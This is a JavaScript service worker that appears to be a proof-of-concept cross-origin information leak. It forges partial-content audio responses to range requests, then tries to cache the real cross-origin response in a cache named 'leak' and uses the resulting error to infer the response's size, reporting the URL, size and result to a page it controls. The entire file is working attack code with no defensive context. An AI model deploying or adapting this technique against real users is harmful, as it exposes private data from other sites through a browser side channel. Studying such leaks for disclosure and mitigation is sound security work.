'use strict';

self.addEventListener("install", () => {
    self.skipWaiting();
});

self.addEventListener("fetch", async (e) => {
	let url = new URL(e.request.url);
	let urlParams = new URLSearchParams(url.search);
	let size = urlParams.get("size");
	let body = "A".repeat(Number(size));

	if (e.request.headers.get("range") === "bytes=0-") {

		e.respondWith(new Response(body, {status: 206, headers: {
			"Content-Type": "audio/mp4",
			"Content-Range": "bytes 0-1/13337"
		}}));

	} else if (e.request.headers.get("range") === `bytes=${Number(size)}-`) {

		let response = await fetch(e.request);
	    let cache    = await caches.open("leak");

	    let rangeError = false;

	    try {
	    	await cache.put(`/leak?${Math.random()}`, response);
	    	rangeError = true;
	    } catch (err) {
	    	rangeError = false;
	    }

	    let clients = await self.clients.matchAll({
	    	includeUncontrolled: true,
	    	type: "window",
	    });

	    clients[0].postMessage({ rangeError, url: url.toString().split("?")[0], size: Number(size) });

	}

});
